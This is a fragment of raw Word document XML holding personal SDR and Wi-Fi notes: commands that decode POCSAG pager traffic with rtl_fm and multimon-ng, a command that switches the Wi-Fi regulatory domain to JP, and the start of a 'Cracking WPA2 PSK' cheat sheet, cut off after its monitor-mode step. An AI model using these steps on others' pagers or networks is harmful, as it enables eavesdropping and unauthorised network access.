          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>dev</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005007BA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005007BA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>stdin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="49EF3594" w14:textId="2BC48C75" w:rsidR="003722F8" w:rsidRDefault="003722F8" w:rsidP="003722F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">Once you've found a POCSAG channel, you can then plug your RTL dongle back into the Pi and use the following command to send output to the headphone jack. In the following example I'm tuning to 153.350MHz. This also has the side benefit of turning your </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>RPi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> into an FM radio </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:noProof/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="09F9A9AE" wp14:editId="2E37BFC4">
            <wp:extent cx="194945" cy="2203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 cy="220345"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="05AA1532" w14:textId="77777777" w:rsidR="004C6465" w:rsidRDefault="004C6465" w:rsidP="003722F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A7D63A1" w14:textId="77777777" w:rsidR="003722F8" w:rsidRPr="004C6465" w:rsidRDefault="003722F8" w:rsidP="003722F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>rtl</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>_fm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> -f 153.350M | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>aplay</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> -r 24k -f S16_LE -t raw -c 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1763F0E1" w14:textId="77777777" w:rsidR="003722F8" w:rsidRDefault="003722F8" w:rsidP="003722F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="701CB5F6" w14:textId="77777777" w:rsidR="003722F8" w:rsidRDefault="003722F8" w:rsidP="003722F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="187D907C" w14:textId="77777777" w:rsidR="003722F8" w:rsidRDefault="003722F8" w:rsidP="003722F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> finally to decode them using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>multimon-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> and output to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>stdin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>, you can use</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68FBDF4D" w14:textId="77777777" w:rsidR="004C6465" w:rsidRDefault="004C6465" w:rsidP="003722F8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue" w:cs="Helvetica Neue"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DFCB5A4" w14:textId="77777777" w:rsidR="004C6465" w:rsidRPr="004C6465" w:rsidRDefault="003722F8" w:rsidP="003722F8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>rtl</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>_fm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> -N -o 4 -A </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>lut</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s 22050 -C -f 153.350M - | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>multimon-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> -t raw -a POCSAG512 -a POCSAG1200 -a POCSAG2400 -f alpha /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>dev</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004C6465">
        <w:rPr>
          <w:rFonts w:ascii="Monaco" w:hAnsi="Monaco" w:cs="Monaco"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:u w:color="760002"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>stdin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="56E7EB29" w14:textId="77777777" w:rsidR="004C6465" w:rsidRDefault="004C6465" w:rsidP="003722F8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="625117F5" w14:textId="22D123EE" w:rsidR="00F534DD" w:rsidRDefault="00FE3060" w:rsidP="003722F8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Channel 13</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C11047E" w14:textId="77777777" w:rsidR="00F534DD" w:rsidRDefault="00F534DD" w:rsidP="00C14F90">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13E64498" w14:textId="1B7ED584" w:rsidR="00F534DD" w:rsidRDefault="00FE3060" w:rsidP="00C14F90">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>iw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F534DD" w:rsidRPr="00F534DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">get </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F534DD" w:rsidRPr="00F534DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>reg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="03E24780" w14:textId="77777777" w:rsidR="00F534DD" w:rsidRPr="00F534DD" w:rsidRDefault="00F534DD" w:rsidP="00C14F90">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1ADDA988" w14:textId="77777777" w:rsidR="00F534DD" w:rsidRDefault="00F534DD" w:rsidP="00C14F90">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F534DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>iw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F534DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> set </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F534DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>reg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F534DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> JP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44BD8A71" w14:textId="77777777" w:rsidR="00561527" w:rsidRDefault="00561527" w:rsidP="00C14F90">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61C7FE91" w14:textId="77777777" w:rsidR="000F33A6" w:rsidRDefault="000F33A6" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6034696F" w14:textId="77777777" w:rsidR="00F477A7" w:rsidRDefault="00F477A7" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55BDC068" w14:textId="77777777" w:rsidR="00F477A7" w:rsidRDefault="00F477A7" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58C1A464" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="008274A1" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Cheatsheet</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> Cracking WPA2 PSK </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17CC6B4B" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00031C10" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">First, put the card in monitor </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t>mode :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="183CE35B"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20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>root@bt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">:~# </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airmon-zc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72EADBFE"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p>
    <w:p w14:paraId="3706997B"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p>
    <w:p w14:paraId="133AE76B" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="001565B0"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b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>root@bt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
